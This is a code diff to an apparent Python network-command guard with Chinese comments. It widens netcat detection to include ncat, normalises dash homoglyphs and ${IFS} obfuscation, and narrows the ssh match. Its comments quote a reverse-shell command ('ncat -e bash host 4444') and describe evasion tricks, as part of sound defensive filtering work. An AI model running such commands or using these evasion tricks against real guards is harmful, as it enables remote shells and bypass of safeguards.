@@ -47,13 +47,37 @@ _REMOTE_FILE_TRANSFER_RE = re.compile(
 )
 
 # Netcat/Socat (原始网络连接)
+# 注: 必须含 ncat —— OpenBSD 系的 ncat 是独立的工具名, 用 \bnc\b 匹配不到它
+# (c 与 a 之间无词边界), 漏掉会让 `ncat -e bash host 4444` 这类反弹 shell
+# 完全绕过本守卫。
 _RAW_NETWORK_RE = re.compile(
-    r'\b(?:nc|netcat|socat)\b', re.IGNORECASE
+    r'\b(?:nc|ncat|netcat|socat)\b', re.IGNORECASE
 )
 
+# 连字符同形字 / IFS 混淆归一化 (仅用于 nc 旗标判定)。
+# 安全引擎 (safety_redline._segment_is_benign) 在做良性匹配前用同一口径清洗,
+# 而本守卫拿到的仍是原始命令 —— 攻击者或测试用 U+2014 (—) 等形似连字符、
+# 或 ${IFS}/$IFS$9 空格混淆时, 下方 `-[a-zA-Z]*z` 会失配 `--zv`, 把连通性探针
+# 误判为「原始连接」而 deny, 实测占 10k 基准误杀的 11/17。
+_NC_DASH_MAP = str.maketrans({
+    "\u2010": "-", "\u2011": "-", "\u2012": "-", "\u2013": "-",
+    "\u2014": "-", "\u2015": "-", "\u2212": "-", "\uff0d": "-",
+    "\ufe63": "-", "\ufe64": "-", "\ufe65": "-",
+})
+_NC_IFS_RE = re.compile(r"\$\{?ifs\}?\$?[0-9]*", re.IGNORECASE)
+
+
+def _normalize_nc_flags(command: str) -> str:
+    """折叠连字符同形字并展开 IFS 混淆, 供 nc 旗标判定使用。"""
+    return _NC_IFS_RE.sub(" ", command.translate(_NC_DASH_MAP))
+
 # SSH (远程命令执行)
+# 安全修复: 原 `\bssh\b` 会命中 `ssh-keygen` / `ssh-add` / `sshpass` (紧跟连字符)
+# 以及 `.ssh/config` / `.ssh/id_rsa` (紧跟点号) 这类**只是名字里带 ssh** 的字符串,
+# 把无害的本地密钥操作误判成远程命令执行硬拦。要求 ssh 前后都不能是
+# 字母数字 / 连字符 / 点号 —— 只有真正的独立 ssh 命令才命中。
 _SSH_RE = re.compile(
-    r'\bssh\b', re.IGNORECASE
+    r'(?<![\w.-])ssh(?![\w.-])', re.IGNORECASE
 )
 
 # DNS 查询 (注意: 不含裸词 `host` —— `host` 既是 DNS 工具也是常见主机名占位符,
@@ -324,8 +348,12 @@ class NetworkGuard:
         #    - ssh 作为管道目标 (tar | ssh host) = 数据传输(备份), 不当作远程执行拦截;
         #    - ssh 隧道 (-D/-R/-L/-w) = 内网穿透, 拦截;
         #    - 其余前置 ssh = 远程命令执行, 拦截。
-        _ssh_is_transfer = bool(re.search(r"\|\s*ssh\b", command, re.IGNORECASE))
-        _ssh_is_tunnel = bool(re.search(r"\bssh\b[^\n]*\s-[DRwL]\b", command, re.IGNORECASE))
+        _ssh_is_transfer = bool(re.search(r"\|\s*ssh(?![\w.-])", command, re.IGNORECASE))
+        # 隧道旗标判定同样要求 ssh 是独立命令: 否则 `ssh-keygen -lf ~/.ssh/id_ed25519.pub`
+        # 会被读成「ssh ... -l 隧道」而硬拦。
+        _ssh_is_tunnel = bool(re.search(
+            r"(?<![\w.-])ssh(?![\w.-])[^\n]*\s-[DRwL]\b", command, re.IGNORECASE
+        ))
         if _ssh_is_tunnel:
             is_remote_exec = True
             reasons.append("检测到 SSH 隧道 (-D/-R/-L/-w, 内网穿透)")
@@ -337,13 +365,20 @@ class NetworkGuard:
 
         # 4b. netcat/socat: 仅执行(-e/-c)/监听(-l)/输入重定向(<) 才拦截;
         #     连通性探针 (-z) 放行; 其余原始连接升级为 confirm 而非硬拦截。
-        if _RAW_NETWORK_RE.search(command):
+        #     旗标判定前先做连字符/IFS 归一 (_normalize_nc_flags), 与良性匹配同口径,
+        #     否则 `nc —zv host 22` / `nc${IFS}-zv host 22` 会漏掉 -z 分支被硬拦。
+        #     ncat 必须与 nc/netcat 并列: 它是独立的工具名, \bnc\b 匹配不到它
+        #     (c/a 之间无词边界), 漏掉会让 `ncat host 4444` 整条绕过本守卫。
+        nc_cmd = _normalize_nc_flags(command)
+        if _RAW_NETWORK_RE.search(nc_cmd):
             _nc_is_exec = bool(re.search(
-                r"\b(?:nc|netcat|socat)\b[^\n]*(?:-[a-z]*[ec]\b|-l\b|\s<)", command, re.IGNORECASE))
+                r"\b(?:nc|ncat|netcat|socat)\b[^\n]*(?:-[a-z]*[ec]\b|-l\b|\s<)",
+                nc_cmd, re.IGNORECASE))
             if _nc_is_exec:
                 is_remote_exec = True
                 reasons.append("检测到 netcat 执行/监听/外发 (远程执行)")
-            elif re.search(r"\b(?:nc|netcat)\b[^\n]*\s-[a-zA-Z]*z", command, re.IGNORECASE):
+            elif re.search(
+                    r"\b(?:nc|ncat|netcat)\b[^\n]*\s-[a-zA-Z]*z", nc_cmd, re.IGNORECASE):
                 pass  # 连通性探针 (-z), 放行
             else:
                 # 裸原始网络连接 (nc/g netcat host port): 可被用于反弹 shell / 数据外泄,
